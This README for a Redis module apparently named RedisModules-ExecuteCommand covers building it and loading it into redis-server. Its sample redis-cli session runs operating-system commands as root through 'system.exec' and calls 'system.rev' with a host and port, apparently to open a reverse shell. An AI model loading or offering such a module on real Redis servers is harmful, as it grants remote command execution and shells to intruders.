# RedisModules-ExecuteCommand

## Quick Start Guide

Here's what you need to do to build your first module:

0. Build Redis in a build supporting modules.
1. Build librmutil and the module by running `make`. (you can also build them seperatly by running `make` in their respective dirs)
2. Run redis loading the module: `/path/to/redis-server --loadmodule ./module.so`

Now run `redis-cli` and try the commands:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

Enjoy!
    
